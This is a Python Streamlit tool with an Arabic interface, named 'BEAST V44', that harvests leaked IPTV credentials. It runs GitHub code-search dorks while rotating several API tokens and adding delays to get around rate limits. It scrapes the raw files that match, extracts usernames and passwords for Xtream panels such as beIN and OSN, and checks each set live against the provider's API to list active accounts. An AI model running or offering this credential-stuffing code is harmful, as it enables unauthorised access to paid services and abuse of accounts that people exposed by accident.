import streamlit as st
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

# --- إعدادات الواجهة ---
st.set_page_config(page_title="BEAST V44 - DUAL ENGINE", layout="wide")

if "auth" not in st.session_state: st.session_state.auth = False
if "hits" not in st.session_state: st.session_state.hits = []

# نظام الدخول
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V44 - DUAL ENGINE</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان (ثيم الهكر المعتاد)
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 12px; margin: 0; }
    .active-hit {
        background: #0d1117; border: 1px solid #00ff41;
        padding: 12px; border-radius: 5px; margin-bottom: 8px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
</style>
""", unsafe_allow_html=True)

# --- القائمة الجانبية ---
with st.sidebar:
    st.title("⚡ BEAST V44")
    
    # خيار اختيار طريقة البحث
    search_method = st.selectbox("اختر طريقة البحث:", 
                                 ["الطريقة الأولى: صفحات لانهائية", 
                                  "الطريقة الثانية: الهجوم السريع (Multi-Token)"])
    
    tokens_raw = st.text_area("أدخل التوكنات (واحد في كل سطر):", height=120)
    tokens_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    
    max_workers = st.slider("سرعة الخيوط (Threads):", 10, 100, 30)
    
    if search_method == "الطريقة الأولى: صفحات لانهائية":
        st.info("هذه الطريقة تفحص كل الصفحات المتاحة لدروك معين حتى النهاية.")
    else:
        st.info("هذه الطريقة تستخدم التوكنات للقفز بين الدروكات بسرعة فائقة.")

    start = st.button("🚀 إطلاق الهجوم")
    if st.button("🗑️ مسح النتائج"):
        st.session_state.hits = []
        st.rerun()

# مناطق العرض
radar_area = st.empty()
st.subheader(f"🏆 النتائج المستخرجة ({len(st.session_state.hits)})")
hits_container = st.container()

# --- وظائف المساعدة ---
def check_server(host, user, pw):
    try:
        api = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api, timeout=3).json()
        if r.get("user_info", {}).get("status") == "Active":
            return {"host": host, "user": user, "pw": pw, "exp": r['user_info'].get('exp_date')}
    except: return None
    return None

def extract_from_content(content):
    pattern = r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)"
    return re.findall(pattern, content)

# --- قائمة الدروكات الضخمة ---
mega_dorks = [
    'extension:txt "get.php?username=" "password="',
    'extension:m3u "player_api.php"',
    'extension:php "panel_api.php"',
    'extension:env "XTREAM_USER"',
    'extension:json "server_url" "password"',
    'extension:log "http://" "username="',
    '"beIN" "get.php?username="',
    '"SSC" "player_api.php"',
    '"OSN" "password=" "http"',
    'extension:m3u8 "username=" "password="'
]

# --- المحرك الرئيسي ---
if start and tokens_list:
    token_idx = 0
    
    for dork in mega_dorks:
        page = 1
        max_p = 100 if search_method == "الطريقة الأولى: صفحات لانهائية" else 10
        
        while page <= max_p:
            current_token = tokens_list[token_idx % len(tokens_list)]
            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
            
            try:
                # محاكاة تأخير بسيط لتفادي الحظر
                time.sleep(random.uniform(0.5, 1.2))
                
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res = requests.get(search_url, headers=headers)
                
                if res.status_code == 403: # التوكن يحتاج راحة
                    token_idx += 1
                    if search_method == "الطريقة الأولى: صفحات لانهائية":
                        radar_area.warning("Rate Limit! switching token...")
                        time.sleep(5)
                    continue

                data = res.json().get('items', [])
                if not data: break # لا توجد نتائج أخرى لهذا الدروك

                radar_area.info(f"🔎 Engine: {search_method} | Dork: {dork[:30]} | Page: {page}")

                raw_urls = [item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/') for item in data]

                # فحص متوازي سريع
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    for url in raw_urls:
                        try:
                            content = requests.get(url, timeout=3).text
                            creds = extract_from_content(content)
                            
                            for h, u, p in creds:
                                radar_area.markdown(f"<p class='scan-log'>🔄 Checking: {h}</p>", unsafe_allow_html=True)
                                
                                # فحص السيرفر
                                result = check_server(h, u, p)
                                if result and result not in st.session_state.hits:
                                    st.session_state.hits.append(result)
                                    with hits_container:
                                        st.markdown(f"""
                                        <div class="active-hit">
                                            <span class="text-green">✅ HIT #{len(st.session_state.hits)}</span><br>
                                            <span style="color:#fff;">HOST: {result['host']}</span><br>
                                            <span class="text-yellow">USER: {result['user']} | PASS: {result['pw']}</span><br>
                                            <small style="color:#888;">Expiry: {result['exp']}</small>
                                        </div>
                                        """, unsafe_allow_html=True)
                        except: continue

                page += 1
                if search_method == "الطريقة الثانية: الهجوم السريع (Multi-Token)":
                    break # في الطريقة الثانية ننتقل للدروك التالي فوراً بعد أول صفحة لضمان التنوع

            except:
                token_idx += 1
                continue

    st.success("🎉 اكتملت المهمة بنجاح!")
